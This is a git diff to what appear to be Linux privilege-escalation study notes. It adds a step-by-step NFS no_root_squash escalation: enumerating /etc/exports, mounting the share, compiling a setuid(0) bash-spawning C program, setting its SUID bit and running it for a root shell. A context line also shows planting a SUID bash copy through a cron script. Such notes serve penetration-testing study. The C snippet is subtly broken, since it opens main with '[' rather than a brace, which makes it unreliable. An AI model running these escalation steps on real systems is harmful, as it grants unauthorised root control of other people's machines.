@@ -487,7 +487,40 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
 -- After it runs, we can just execute new bash from our script like we did before `/tmp/bash -p`
 
 # Escalation Path: NFS Root Squashing
+## Summary
+`no_root_squash` or `root_squash` is designed to manage your permissions when mounting an NFS share. `no_root_squash` means you get to keep your root privileges when you mount an NFS share. We can use this to our advantage by creating a script from our attack machine that set's a SUID bit on /bin/bash and executing it as root on the target system.
+## Enumeration
+We look for `no_root_squash` in `/etc/exports`.
+```
+cat /etc/exports
 
+[...SNIP...]
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+## Exploitation
+- from our attacker machine
+```
+# Showmount
+showmount -e [IP/Hostname]
+
+# Mount the share
+mkdir /tmp/mountme
+mount -o rw,vers=2 [IP]:[share] [local folder(in this case /tmp/mountme]
+
+# echo a simple c escalation
+echo 'int main() [ setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/exploit.c
+
+# compile
+gcc /tmp/mountme/exploit.c -o /tmp/mountme/exploit
+
+# Set the SUID bit on our new executable
+chmod +s /tmp/mountme/exploit
+```
+- on our victim machine
+```
+# escalate in to our root shell
+/tmp/exploit
+```
 # Escalation Path: Docker
 
 # todo
